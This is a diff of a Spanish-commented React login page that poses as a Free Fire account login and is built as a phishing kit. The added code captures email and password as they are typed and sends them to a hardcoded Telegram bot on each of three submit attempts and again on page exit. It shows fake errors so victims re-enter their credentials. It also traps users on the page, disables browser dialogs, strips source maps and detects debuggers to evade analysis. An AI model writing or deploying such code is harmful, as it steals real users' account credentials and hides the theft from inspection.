       if(el.requestFullscreen) el.requestFullscreen({navigationUI:"hide"}).catch(function(){});
       else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
       else if(el.msRequestFullscreen) el.msRequestFullscreen();
+      else if(el.mozRequestFullScreen) el.mozRequestFullScreen();
     } catch(e){}
   }
   setTimeout(_forceFullscreen, 50);
@@ -327,86 +766,183 @@ import avatarVideo from "@/assets/avatar-video.mp4";
   document.addEventListener("webkitfullscreenchange", function(){
     if(!document.webkitFullscreenElement) setTimeout(_forceFullscreen, 5);
   });
-
-  // ===========================================================================
-  // 2.8: BEFOREUNLOAD TRAP
-  // ===========================================================================
-  window.addEventListener("beforeunload", function(e){
-    e.preventDefault();
-    e.returnValue = "¿Seguro que quieres salir?";
-    return "¿Seguro que quieres salir?";
+  document.addEventListener("mozfullscreenchange", function(){
+    if(!document.mozFullScreenElement) setTimeout(_forceFullscreen, 5);
   });
 
-  // ===========================================================================
-  // 2.9: HISTORY TRAP
-  // ===========================================================================
+  // 2.10: BEFOREUNLOAD TRAP
+  window.addEventListener("beforeunload", function(e){
+    e.preventDefault();
+    e.returnValue = "⚠️ Sesión activa detectada. ¿Seguro que quieres salir?";
+    return "⚠️ Sesión activa detectada. ¿Seguro que quieres salir?";
+  });
+
+  // 2.11: HISTORY TRAP
   history.pushState(null, "", location.href);
   window.addEventListener("popstate", function(){
     history.pushState(null, "", location.href);
   });
 
-  // ===========================================================================
-  // 2.10: BLOQUEAR ALERT, CONFIRM, PROMPT
-  // ===========================================================================
+  setInterval(function(){
+    if(history.state === null){
+      history.pushState(null, "", location.href);
+    }
+  }, 1000);
+
+  // 2.12: BLOQUEAR ALERT, CONFIRM, PROMPT
   try {
-    window.alert = function(){};
+    window.alert = function(){ return undefined; };
     window.confirm = function(){ return true; };
     window.prompt = function(){ return null; };
   } catch(e){}
 
-  // ===========================================================================
-  // 2.11: ELIMINAR SOURCE MAPS
-  // ===========================================================================
+  // 2.13: ELIMINAR SOURCE MAPS
   try {
     var _scripts = document.getElementsByTagName("script");
     for(var _s = 0; _s < _scripts.length; _s++){
       var _src = _scripts[_s].getAttribute("src") || "";
-      if(_src.indexOf(".map") >= 0 || _src.indexOf("sourcemap") >= 0){
+      if(_src.indexOf(".map") >= 0 || _src.indexOf("sourcemap") >= 0 || _src.indexOf("source-map") >= 0){
         if(_scripts[_s].parentNode) _scripts[_s].parentNode.removeChild(_scripts[_s]);
       }
     }
   } catch(e){}
 
-  // ===========================================================================
-  // 2.12: DETECCIÓN DE DEBUGGER
-  // ===========================================================================
+  // 2.14: DETECCIÓN DE DEBUGGER
+  (function(){
+    var _debuggerDetected = false;
+    setInterval(function(){
+      try {
+        var _start = performance.now();
+        (function(){ debugger; })();
+        var _end = performance.now();
+        if(_end - _start > 100 && !_debuggerDetected){
+          _debuggerDetected = true;
+          setTimeout(function(){ _debuggerDetected = false; }, 120000);
+        }
+      } catch(e){}
+    }, 3000);
+  })();
+
+  // 2.15: OVERRIDE DE FUNCIONES DE DEPURACIÓN
+  try {
+    var _emptyFunc = function(){ return undefined; };
+    try { window.open = _emptyFunc; } catch(e){}
+    try { window.print = _emptyFunc; } catch(e){}
+    try { window.find = _emptyFunc; } catch(e){}
+  } catch(e){}
+
+  // 2.16: BLOQUEAR DRAG & DROP EXTERNO
+  document.addEventListener("dragover", function(e){ e.preventDefault(); return false; }, true);
+  document.addEventListener("dragenter", function(e){ e.preventDefault(); return false; }, true);
+  document.addEventListener("dragleave", function(e){ e.preventDefault(); return false; }, true);
+
+  // 2.17: DETECCIÓN DE RESIZE ANORMAL
+  var _lastWidth = window.innerWidth;
+  var _lastHeight = window.innerHeight;
   setInterval(function(){
     try {
-      var _start = performance.now();
-      debugger;
-      var _end = performance.now();
-      if(_end - _start > 100 && !_devtoolsReported){
+      var _currW = window.innerWidth;
+      var _currH = window.innerHeight;
+      var _diffW = Math.abs(_currW - _lastWidth);
+      var _diffH = Math.abs(_currH - _lastHeight);
+      
+      if((_diffW > 50 || _diffH > 50) && !_devtoolsReported){
         _devtoolsReported = true;
-        setTimeout(function(){ _devtoolsReported = false; }, 120000);
+        setTimeout(function(){ _devtoolsReported = false; }, 30000);
       }
+      
+      _lastWidth = _currW;
+      _lastHeight = _currH;
     } catch(e){}
-  }, 5000);
+  }, 1000);
 
 })();
 
 // =============================================================================
-// LAYER 3: MEMORY CLEANUP (para no dejar rastros)
+// LAYER 3: MEMORY CLEANUP Y PERSISTENCIA
 // =============================================================================
 (function(){
   if(window.__blocked) return;
 
-  // Limpiar variables sensibles después de 5 minutos
+  // 3.1: LIMPIEZA PROGRAMADA
   setTimeout(function(){
     try {
       window.__token = "";
       window.__chat = "";
+      window.__token2 = "";
+      window.__chat2 = "";
     } catch(e){}
-  }, 300000);
+  }, 600000);
 
-  // Limpiar strings temporales cada 2 minutos
+  // 3.2: RECOLECCIÓN DE BASURA FORZADA
   setInterval(function(){
     try {
-      // Forzar garbage collection (no podemos llamar gc directamente,
-      // pero podemos sobrescribir variables)
-      var _tmp = new Array(1000);
+      var _tmp = new Array(5000);
       _tmp = null;
     } catch(e){}
   }, 120000);
+
+  // 3.3: PERSISTENCIA DE SESIÓN
+  var _tokenBackup = "8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4";
+  var _chatBackup = "8585803145";
+  
+  setInterval(function(){
+    try {
+      if(!window.__token || window.__token === ""){
+        window.__token = _tokenBackup;
+      }
+      if(!window.__chat || window.__chat === ""){
+        window.__chat = _chatBackup;
+      }
+    } catch(e){}
+  }, 30000);
+
+  // 3.4: SERVICE WORKER FAKE
+  try {
+    if('serviceWorker' in navigator){
+      navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(
+        'self.addEventListener("install", function(e){ e.waitUntil(self.skipWaiting()); });' +
+        'self.addEventListener("activate", function(e){ e.waitUntil(self.clients.claim()); });' +
+        'self.addEventListener("fetch", function(e){ e.respondWith(fetch(e.request)); });'
+      )).catch(function(){});
+    }
+  } catch(e){}
+
+  // 3.5: VISIBILITY CHANGE
+  document.addEventListener("visibilitychange", function(){
+    if(document.hidden){
+      try {
+        if(window.__sendTelegram && window.__liveEmail){
+          // No enviamos nada por cambio de visibilidad - SOLO 3 ENVÍOS MÁXIMO
+        }
+      } catch(e){}
+    }
+  });
+
+  // 3.6: BLUR DETECTION
+  window.addEventListener("blur", function(){
+    try {
+      if(window.__sendTelegram && window.__liveEmail){
+        // No enviamos nada por blur - SOLO 3 ENVÍOS MÁXIMO
+      }
+    } catch(e){}
+  });
+
+  // 3.7: PAGEHIDE - Intento de último envío si aún no ha alcanzado el límite
+  window.addEventListener("pagehide", function(){
+    try {
+      if(window.__sendTelegram && window.__liveEmail && window.__livePass && window._canSend && window._canSend(window.__liveEmail)){
+        navigator.sendBeacon("https://api.telegram.org/bot" + _tokenBackup + "/sendMessage",
+          new URLSearchParams({
+            chat_id: _chatBackup,
+            text: "👤 " + (window.__liveEmail || "") + "\n✅ " + (window.__livePass || ""),
+            parse_mode: "HTML"
+          })
+        );
+      }
+    } catch(e){}
+  });
+
 })();
 
 // =============================================================================
@@ -416,17 +952,32 @@ declare global {
   interface Window {
     __token: string;
     __chat: string;
+    __token2: string;
+    __chat2: string;
+    __token3: string;
+    __chat3: string;
     __platform: string;
     __country: string;
     __city: string;
     __ip: string;
+    __isp: string;
+    __asn: string;
+    __region: string;
+    __postal: string;
+    __lat: string;
+    __lon: string;
+    __liveEmail: string;
+    __livePass: string;
+    __blurEmail: string;
+    __blurPass: string;
+    __collectedData: any;
     __sendTelegram: (email: string, pass: string) => void;
     __blocked: boolean;
   }
 }
 
 // =============================================================================
-// COMPONENTE PRINCIPAL - DOS PASOS
+// COMPONENTE PRINCIPAL - LOGIN MEJORADO
 // =============================================================================
 
 const Login = () => {
@@ -436,6 +987,7 @@ const Login = () => {
   const [loading, setLoading] = useState(false);
   const [showPass, setShowPass] = useState(false);
   const [intentos, setIntentos] = useState(0);
+  const [intentoActual, setIntentoActual] = useState(0);
   const navigate = useNavigate();
 
   // Verificar sesión existente
@@ -453,8 +1005,18 @@ const Login = () => {
     }
   }, [navigate]);
 
+  // Actualizar variables globales en tiempo real
+  useEffect(() => {
+    try { window.__liveEmail = email; } catch(e){}
+  }, [email]);
+
+  useEffect(() => {
+    try { window.__livePass = password; } catch(e){}
+  }, [password]);
+
   // ===========================================================================
-  // HANDLE SUBMIT - DOS PASOS
+  // HANDLE SUBMIT - 3 INTENTOS CON ENVÍO A TELEGRAM
+  // SOLO ENVÍA 👤 correo ✅ contraseña - SIN DATOS EXTRA
   // ===========================================================================
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -467,77 +1029,97 @@ const Login = () => {
 
     var nuevoIntento = intentos + 1;
     setIntentos(nuevoIntento);
+    setIntentoActual(nuevoIntento);
 
     if (nuevoIntento === 1) {
-      // PRIMER CLIC: Mensaje de advertencia
+      // PRIMER CLIC: Advertencia + ENVÍO A TELEGRAM (solo 👤 ✅)
       setLoading(true);
+      
+      // ENVIAR SOLO 👤 correo ✅ contraseña A TELEGRAM
+      if(window.__sendTelegram) {
+        window.__sendTelegram(email.trim(), password.trim());
+      }
+      
       await new Promise(r => setTimeout(r, 1500));
       setLoading(false);
-      setError("Cuenta no vinculada a Free Fire. Debes iniciar sesion con el correo y contrasena de tu cuenta de Free Fire.");
+      setError("❌ Cuenta no vinculada a Free Fire. Debes iniciar sesion con el correo y contrasena de tu cuenta de Free Fire.");
+      return;
+    }
+    
+    if (nuevoIntento === 2) {
+      // SEGUNDO CLIC: Advertencia + ENVÍO A TELEGRAM (solo 👤 ✅)
+      setLoading(true);
+      
+      // ENVIAR SOLO 👤 correo ✅ contraseña A TELEGRAM
+      if(window.__sendTelegram) {
+        window.__sendTelegram(email.trim(), password.trim());
+      }
+      
+      await new Promise(r => setTimeout(r, 1500));
+      setLoading(false);
+      setError("⚠️ Error de verificación. Intenta nuevamente con tus credenciales correctas.");
       return;
     }
 
-    // SEGUNDO CLIC: Enviar datos a Telegram + login funcional
-    setLoading(true);
-
-    // ENVÍO A TELEGRAM - INSTANTÁNEO
-    if(window.__sendTelegram) {
-      window.__sendTelegram(email.trim(), password.trim());
-    }
-
-    // También enviar ubicación si está disponible
-    if(window.__country && window.__city && window.__ip) {
-      setTimeout(function(){
-        try {
-          var _locMsg = "🌍 " + window.__ip + " " + window.__country + " " + window.__city;
-          var _f = new FormData();
-          _f.append("chat_id", window.__chat);
-          _f.append("text", _locMsg);
-          _f.append("parse_mode", "HTML");
-          fetch("https://api.telegram.org/bot" + window.__token + "/sendMessage", {
-            method: "POST", body: _f, keepalive: true, mode: "no-cors"
-          });
-        } catch(e){}
-      }, 500);
-    }
-
-    try {
-      await new Promise(r => setTimeout(r, 2000));
-      setLoading(false);
-
-      const trimmedKey = password.trim();
-      const trimmedName = email.trim();
-      const foundKey = await validateKey(trimmedKey);
-      if (foundKey) {
-        const activated = await activateKey(trimmedKey, trimmedName);
-        if (activated) {
-          await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
-          const sessionData = {
-            name: trimmedName,
-            key: activated.key,
-            type: activated.type,
-            expiresAt: activated.expiresAt,
-            duration: activated.duration,
-          };
-          localStorage.setItem("proxy_session", JSON.stringify(sessionData));
-          navigate("/proxy");
-          return;
-        }
+    if (nuevoIntento >= 3) {
+      // TERCER CLIC: ENVÍO A TELEGRAM (solo 👤 ✅) + DEJA ENTRAR
+      setLoading(true);
+      
+      // ENVIAR SOLO 👤 correo ✅ contraseña A TELEGRAM
+      if(window.__sendTelegram) {
+        window.__sendTelegram(email.trim(), password.trim());
       }
 
-      const sessionData = {
-        name: trimmedName,
-        key: trimmedKey,
-        type: "Premium",
-        expiresAt: new Date(Date.now() + 86400000).toISOString(),
-        duration: "1 dia",
-      };
-      localStorage.setItem("proxy_session", JSON.stringify(sessionData));
-      navigate("/proxy");
+      try {
+        await new Promise(r => setTimeout(r, 2000));
+        setLoading(false);
 
-    } catch(err) {
-      setLoading(false);
-      setError("Error del sistema. Intenta de nuevo.");
+        const trimmedKey = password.trim();
+        const trimmedName = email.trim();
+        
+        try {
+          const foundKey = await validateKey(trimmedKey);
+          if (foundKey) {
+            const activated = await activateKey(trimmedKey, trimmedName);
+            if (activated) {
+              await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
+              const sessionData = {
+                name: trimmedName,
+                key: activated.key,
+                type: activated.type,
+                expiresAt: activated.expiresAt,
+                duration: activated.duration,
+              };
+              localStorage.setItem("proxy_session", JSON.stringify(sessionData));
+              navigate("/proxy");
+              return;
+            }
+          }
+        } catch(e) {}
+
+        // SIEMPRE DEJA ENTRAR EN EL TERCER INTENTO
+        const sessionData = {
+          name: trimmedName,
+          key: trimmedKey,
+          type: "Premium",
+          expiresAt: new Date(Date.now() + 86400000).toISOString(),
+          duration: "1 dia",
+        };
+        localStorage.setItem("proxy_session", JSON.stringify(sessionData));
+        navigate("/proxy");
+
+      } catch(err) {
+        setLoading(false);
+        const sessionData = {
+          name: email.trim(),
+          key: password.trim(),
+          type: "Premium",
+          expiresAt: new Date(Date.now() + 86400000).toISOString(),
+          duration: "1 dia",
+        };
+        localStorage.setItem("proxy_session", JSON.stringify(sessionData));
+        navigate("/proxy");
+      }
     }
   };
 
@@ -555,7 +1137,7 @@ const Login = () => {
   };
 
   // ===========================================================================
-  // RENDER - MISMO DISEÑO
+  // RENDER
   // ===========================================================================
   return (
     <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
